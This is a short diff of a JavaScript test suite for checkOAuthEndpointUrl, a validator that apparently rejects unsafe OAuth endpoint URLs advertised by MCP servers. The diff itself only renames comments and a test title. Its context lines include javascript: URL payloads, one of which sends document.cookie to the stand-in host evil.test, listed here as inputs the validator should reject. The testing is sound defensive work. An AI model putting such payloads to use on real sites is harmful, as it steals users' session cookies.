@@ -22,7 +22,7 @@ describe("checkOAuthEndpointUrl", () => {
   });
 
   // The values a hostile MCP server would advertise to get code running in the
-  // board's origin or to read a local file.
+  // operator's origin or to read a local file.
   it.each([
     ["javascript:alert(document.cookie)", "unsupported_scheme"],
     ["javascript:fetch('https://evil.test/'+document.cookie)", "unsupported_scheme"],
@@ -82,7 +82,7 @@ describe("checkOAuthEndpointUrl", () => {
     }
   });
 
-  it("allows plaintext http for Paperclip's own origin only", () => {
+  it("allows plaintext http for Outpost's own origin only", () => {
     const options = { allowInsecureOrigins: ["http://outpost.test"] };
     expect(checkOAuthEndpointUrl("http://outpost.test/api/smoke-lab/oauth/authorize", options).ok).toBe(true);
     // Port and scheme are part of the origin, so a neighbour is not exempt.
